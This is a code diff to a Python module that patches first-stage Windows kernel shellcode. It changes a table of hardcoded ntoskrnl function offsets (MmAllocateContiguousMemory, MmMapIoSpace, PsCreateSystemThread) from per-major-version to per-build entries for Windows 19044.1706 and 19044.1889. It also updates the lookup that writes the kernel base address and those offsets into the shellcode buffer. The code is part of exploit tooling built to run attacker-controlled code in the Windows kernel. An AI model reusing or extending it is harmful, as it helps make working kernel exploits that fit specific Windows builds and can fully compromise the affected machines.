@@ -1,11 +1,16 @@
 from kernel_shellcode_library.customize_shellcode import modify
 
 
-funcs_majors = {
-    19041: {
+funcs_pi_addresses_by_ver = {
+    "19044.1706": {
         "mm_allocate_contiguous_memory": 0x52c980,
         "mm_map_io_space": 0x318320,
         "ps_create_system_thread": 0x6428f0
+    },
+    "19044.1889": {
+        "mm_allocate_contiguous_memory": 0x52c480,
+        "mm_map_io_space": 0x2064a0,
+        "ps_create_system_thread": 0x6cedd0
     }
 }
 
@@ -44,7 +49,8 @@ def read_second_stage(config):
 def patch_first_stage(sh_offsets, config, shellcode, ntoskrnl_base_addr_hex):
     # each first stage should have, defined in offsets, the fields as the default (in offsets.json)
     # TODO: possibility of patching first-stage egg?
-    if config['win_major_version'] not in funcs_majors:
+    version = '.'.join([config['win_major_version'], config['win_minor_version']])
+    if version not in funcs_pi_addresses_by_ver:
         raise NotImplementedError
     if ntoskrnl_base_addr_hex.startswith("0x"):
         ntoskrnl_base_addr_hex = ntoskrnl_base_addr_hex[2:]
@@ -52,7 +58,7 @@ def patch_first_stage(sh_offsets, config, shellcode, ntoskrnl_base_addr_hex):
     shellcode = modify(addr_offset, ntoskrnl_base_addr_hex, shellcode, swap_bytes=True)
     for func_name in sh_offsets["hardcoded_function_offsets"]:
         func_offset = sh_offsets["hardcoded_function_offsets"][func_name]
-        func_pi_address = funcs_majors[config['win_major_version']][func_name]
+        func_pi_address = funcs_pi_addresses_by_ver[version][func_name]
         addr = hex(func_pi_address)[2:]
         shellcode = modify(func_offset, addr, shellcode, swap_bytes=True)
     return shellcode
